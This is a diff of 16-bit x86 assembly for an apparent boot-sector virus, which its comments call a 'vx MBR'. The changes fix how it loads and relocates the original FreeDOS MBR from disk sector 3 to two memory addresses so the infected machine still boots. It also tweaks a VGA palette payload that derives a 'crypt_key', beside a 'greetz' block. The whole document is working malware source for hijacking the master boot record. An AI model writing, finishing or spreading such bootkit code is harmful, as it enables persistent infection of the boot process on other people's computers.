@@ -97,23 +97,23 @@ gen_rand_shifts:
 
 set_pal:
 	salc				;set carry flag in al, if carry flag set, al=0
-	mov	dx,VGA_PAL_INDEX	;
+	mov	dx, VGA_PAL_INDEX	;
 	out	dx, al
 	inc	dx
 	pal_1:
-		;add ax, [randshift0]
-		;mov ax, randshift0
-		;shr ax, randshiftnum
+		push ax
+		push cx
 		or	ax, 0000111100110011b
-		or ax, [randtimer]
-		push	ax
 		shr	ax, 10
-		shr	ax, randshift0
-		out	dx,al
+		mov cl, [randshift0]
+		xor al, cl
+		out	dx, al
 		mul	al
-		shl	ax, randshift1
+		mov cl, [randshift1]
+		shl ax, cl
 		shl	ax, 6
-		out 	dx,al
+		out dx,al
+		pop	cx
 		pop	ax
 		mov [crypt_key], ax
 		out	dx,al
@@ -211,7 +211,8 @@ load_og_mbr:
 	xor ax, ax		;reset disk
 	int 13h
 ;	mov ax, 0x07c0
-	mov ax, 0x01fe
+;	mov ax, 0x01fe
+	xor ax, ax
 
 ;The FreeDOS MBR actually relocates itself to high-mem 
 ;(common bootkit technique, though also a common bootloader technique generally)
@@ -233,9 +234,19 @@ read_sector:
 	mov ch, 0
 	mov cl, 3		;cylinder 0, sector 3 
 	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
-	lea bx, es:[di]
+	lea bx, [es:di]
 	int 13h
-
+	
+	mov cx, 0x100
+	push cx
+	
+	; copy original MBR to two locations:
+	;	1. 0x01fe:0x7c00 (high memory location of MBR, loaded at standard 0x7c00 offset)
+	;	2. 0x0:0x7c00 "typical" address for MBR load on boot; also the address where
+	;	   the FreeDOS boot sector expects to find a copy of its original MBR
+	;	   if our vx MBR is still at 0x0:0x7c00, then we enter an infinite loop
+	;      due to the implementation of the FreeDOS MBR
+	; copying the original MBR twice here attempts to solve that niche problem
 	copy_sector_loop:
 		mov word ax, [bx]
 		stosw
@@ -243,13 +254,26 @@ read_sector:
 		dec cx
 		cmp cx, 0
 		jnz copy_sector_loop
+	cmp byte [repeat_check], 0x1
+	jz fin
+
+	pop cx
+	xor ax, ax
+	mov es, ax
+	mov ds, ax
+	xor si, si
+	mov byte [repeat_check], 0x1
+	jmp copy_sector_loop
+
+fin:
 	jmp bootfinal:bootfinaloff
 
 ;	jmp bootfinal:0
 
 
 ;bootfinal equ 0x07c0
-bootfinal equ 0x01fe
+;bootfinal equ 0x01fe
+bootfinal equ 0x0
 bootfinaloff equ 0x7c00
 
 
@@ -261,11 +285,16 @@ greetz_len	equ $-greetz
 
 crypt_key:
 	dw 0
+
+repeat_check:
+	db 0x0
 	
 randtimer:
 	db 0
+
 randshiftnum:
 	db 0
+
 randshift0:
 	db 0
 
